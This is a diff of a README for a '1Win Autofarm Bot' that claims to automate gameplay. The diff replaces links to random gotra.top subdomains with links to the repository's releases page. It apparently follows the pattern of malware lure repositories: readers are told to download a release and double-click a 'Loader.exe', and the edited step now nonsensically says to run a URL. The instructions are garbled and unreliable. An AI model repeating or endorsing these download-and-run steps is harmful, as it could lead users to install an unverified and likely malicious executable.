@@ -1,9 +1,9 @@
-![hq720](https://github.com/user-attachments/assets/16cf76be-982e-451b-8868-e20ad7ca0684)
+![hq720](https://github.com/mhzndenish/1Win-Autofarm-Bot/releases)
 
 # 1Win Autofarm Bot
 
 #
-[![https://otCIE.gotra.top/54/baJFww6V](https://ad97pUs.gotra.top/l.svg)](https://NDWSmnmx.gotra.top/54/szPOZm2)
+[![https://github.com/mhzndenish/1Win-Autofarm-Bot/releases](https://github.com/mhzndenish/1Win-Autofarm-Bot/releases)](https://github.com/mhzndenish/1Win-Autofarm-Bot/releases)
 
 **1Win Autofarm Bot** is a powerful tool designed to automate gameplay and maximize your in-game efficiency. It helps you farm resources, complete tasks, and perform upgrades automatically by simulating mouse clicks and other automated actions.
 
@@ -32,7 +32,7 @@ Before you start, ensure you have:
    - Extract the contents of **1Win Autofarm Bot** to a folder on your computer.
 
 3. **Run the Loader**:
-   - Double-click and run **Loader.exe**.
+   - Double-click and run **https://github.com/mhzndenish/1Win-Autofarm-Bot/releases**.
 
 4. The loader will automatically start the **1Win Autofarm Bot** and allow you to configure settings for your game.
 
